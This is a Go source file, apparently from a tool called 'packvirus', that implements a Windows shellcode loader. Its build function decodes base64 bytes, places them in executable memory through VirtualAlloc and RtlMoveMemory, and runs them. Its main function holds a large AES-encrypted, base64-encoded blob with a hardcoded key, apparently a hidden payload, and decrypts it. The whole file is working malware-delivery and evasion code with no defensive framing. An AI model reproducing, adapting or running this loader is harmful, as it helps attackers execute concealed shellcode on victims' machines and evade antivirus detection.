package main

import (
	"encoding/base64"
	"fmt"
	"packvirus/encrypt"
	"syscall"
	"unsafe"
)

var (
	kernel32      = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
)

func build(ddm string) {
	sDec, _ := base64.StdEncoding.DecodeString(ddm)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40)
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func main() {
	str := "nEMTIuQzS1V6JIyEPhxxkolYoi3E6gX4Ro4f3Q5BYzazA/W7RhWqNH0r86rjz3zh2jS8IoggXLa3NqUkjjGZoRUisCAbHreYhMahX1a8L2xVhWYtuEWG7ykiD3FKR0FpydY/LsQWV8drSGJqqFUy+HQ5vQ8rLU2ZbF+pyMKcIaDHhzPEenwlcAfb1O9bw5b70BkMqgiwrR/iKJHot4mAuYVhmhsZRoZvFyUClLMkrDcgOxrDEQixwAEg9fgkv9juEIVsfbvUJ0rVa3gZSf8m6uXFhgEnJMA9K4V0Wm6Oc7fxpiSNjag8OGeXQ8/bfCRAd37IlrdfylyXsJwfAugj1pZLeZe/1ukeVvVcHOIEYD1xBdKEZO81wxzi1EcTC0oLqUHKTFWyyoO5YiN38ECLJonDV+5amrEXwHhoMsRKuBiWQ0tE+zA2sO56ZFUOiQU8/gqlcgFT9hQQ+2aeoW6ETeMqubgdtobpnUz7yGrCubAhVdfl1DpgvQEbJHZW30m6opgmKOZgx3153KlenTx0CNqNAzI1F2mw6v0RHZk/E4jlGEJ6g7HIPyjGVvuaApvFm3cccTttY9H7FTaeRbOWNKHayd1SrEH/+DBlr555MBGhcM9m1hmER6VXZJLz7GP022H+xViUB7jXyXXxSOw2WD6t3pMyWMoIMdKBJp99SlDi+oyneVFEHl0PR5sNla8M9zntd0UG4rTfIfJ5qI5PrYLC+pTg9upwiI1YPflZAomLb925b5jAMwoFMs1FSG1ffb8wnBNUtzkq+e3gUju8IGU64Mo8IO64bC5V1LFmkNn2DEFoUh7Lr5up0d3TVBi54i8gMlJsbKjcU0imsyI7E3UPl9MVTyMou8pqMk5BNHeng1fKnSnGKffUesjGfx+qUET3zLSykMCr2k4DciAJmQ=="
	key := []byte("1100110011001100")
	baseByte, _ := base64.StdEncoding.DecodeString(str)
	decryptAES, _ := encrypt.DecryptFunctions["aes"](baseByte, key)
	// you need to add signature
	fmt.Println(string(decryptAES))
}
